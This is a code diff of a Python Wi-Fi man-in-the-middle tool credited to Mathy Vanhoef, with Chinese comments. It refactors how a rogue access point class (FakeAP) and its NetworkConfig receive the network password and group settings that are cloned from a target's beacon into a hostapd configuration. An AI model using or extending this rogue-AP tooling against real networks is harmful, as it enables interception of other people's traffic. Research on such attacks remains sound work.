@@ -35,7 +35,7 @@ def print_rx(level, name, p, color=None, suffix=None):
 
 
 class NetworkConfig():
-    def __init__(self):
+    def __init__(self, group, password):
         self.ssid = None
         self.real_channel = None
         self.group_cipher = None
@@ -44,6 +44,8 @@ class NetworkConfig():
         self.akms = set()
         self.wmmenabled = 0
         self.capab = 0
+        self.group = group
+        self.password = password
 
     # 檢查 beacon frame MAC層是否包含RSNE訊息，沒有就代表非使用RSN網路(為WEP)
     def is_wparsn(self):
@@ -130,9 +132,9 @@ wpa_passphrase={password}"""
                               for idx in self.pairwise_ciphers]),
             ptksa_counters=(self.capab & 0b001100) >> 2,
             gtksa_counters=(self.capab & 0b110000) >> 4,
-            wmmadvertised=int(args.group),
+            wmmadvertised=int(self.group),
             wmmenabled=self.wmmenabled,
-            password=str(args.password))
+            password=str(self.password))
 
 
 class ClientState():
@@ -176,13 +178,15 @@ class ClientState():
 
 
 class FakeAP():
-    def __init__(self, nic_real_mon, nic_real_clientack, nic_rogue_ap, nic_rogue_mon, ssid, clientmac=None, dumpfile=None, cont_csa=False):
+    def __init__(self, nic_real_mon, nic_real_clientack, nic_rogue_ap, nic_rogue_mon, ssid, password, group, clientmac=None, dumpfile=None, cont_csa=False):
         self.nic_real_mon = nic_real_mon
         self.nic_real_clientack = nic_real_clientack
         self.nic_rogue_ap = nic_rogue_ap
         self.nic_rogue_mon = nic_rogue_mon
         self.dumpfile = dumpfile
         self.ssid = ssid
+        self.password = password
+        self.group = group
         self.beacon = None
         self.apmac = None
         self.netconfig = None
@@ -364,7 +368,7 @@ class FakeAP():
             return
 
         # 將 wifi ap 的 beacon 訊息紀錄，用來產生 hostapd.conf
-        self.netconfig = NetworkConfig()
+        self.netconfig = NetworkConfig(self.group, self.password)
         self.netconfig.from_beacon(self.beacon)
         if not self.netconfig.is_wparsn():
             log(ERROR, "裝置目前連接的網路，使用 WEP 協議。")
@@ -514,6 +518,6 @@ if __name__ == "__main__":
 
     print("\n\t===[ channel-based MitM position by Mathy Vanhoef ]====\n")
     attack = FakeAP(args.nic_real_mon, args.nic_real_clientack, args.nic_rogue_ap,
-                    args.nic_rogue_mon, args.ssid, args.target, args.dump, args.continuous_csa)
+                    args.nic_rogue_mon, args.ssid, args.password, args.group, args.target, args.dump, args.continuous_csa)
     atexit.register(cleanup)
     attack.run(strict_echo_test=args.strict_echo_test)
